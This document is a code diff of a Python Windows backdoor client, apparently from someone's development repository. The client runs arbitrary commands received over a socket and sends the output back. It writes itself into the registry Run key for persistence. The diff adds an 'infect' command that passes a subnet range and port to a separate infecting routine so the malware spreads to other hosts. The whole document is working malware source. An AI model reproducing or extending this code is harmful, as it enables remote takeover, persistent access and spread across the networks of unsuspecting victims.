@@ -1,10 +1,11 @@
+import os
+import sys
+import time
+import ctypes
 import socket
 import subprocess
-import os
-import ctypes
-import time
 import winreg as reg
-import sys
+from Features.Features import *
     
 def add_to_registry(sock):
     key = r'Software\Microsoft\Windows\CurrentVersion\Run'
@@ -25,6 +26,7 @@ def add_to_registry(sock):
         sock.sendall(error_msg.encode())
 
 def shell(sock):
+    feature = Features()
     while True:
         try:
             # Nhận dữ liệu từ server
@@ -32,7 +34,6 @@ def shell(sock):
             try:
                 buffer = buffer.decode('utf-8').strip()
             except UnicodeDecodeError:
-                # Xử lý lỗi giải mã, có thể giữ nguyên dữ liệu nhị phân
                 print("Received non-UTF-8 data")
                 buffer = buffer.decode('latin-1').strip()  # Thay thế bằng bảng mã khác nếu cần
 
@@ -59,14 +60,29 @@ def shell(sock):
                 add_to_registry(sock)  # Gọi hàm để thêm vào Registry
             # Xử lý lệnh infect
             elif buffer.startswith('infect'):
-                total_response = "Infection is running\n"
-                sock.sendall(total_response.encode())
+                # Tách các tham số từ lệnh
+                parts = buffer.split()
+                # Đặt giá trị mặc định
+                network_prefix = '10.20.25'
+                target_port = 80
+                start_ip = 1
+                end_ip = 100
+                if len(parts) >= 2:
+                    network_prefix = parts[1]
+                if len(parts) >= 3:
+                    target_port = int(parts[2])
+                if len(parts) >= 4:
+                    start_ip = int(parts[3]) 
+                if len(parts) >= 5:
+                    end_ip = int(parts[4])
+                feature.infecting(sock, network_prefix, target_port, start_ip, end_ip)
             # Xử lý các lệnh khác
             else:
                 process = subprocess.Popen(buffer, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 stdout, stderr = process.communicate()
-                total_response = stdout + stderr
-                sock.sendall(total_response)  # Gửi lại đầu ra dạng byte
+                # Giải mã stdout và stderr với mã hóa 'latin-1'
+                total_response = stdout.decode('latin-1') + stderr.decode('latin-1')
+                sock.sendall(total_response.encode('utf-8'))  # Gửi lại đầu ra dạng byte
         except socket.error as e:
             print(f"Socket error: {e}")
             break
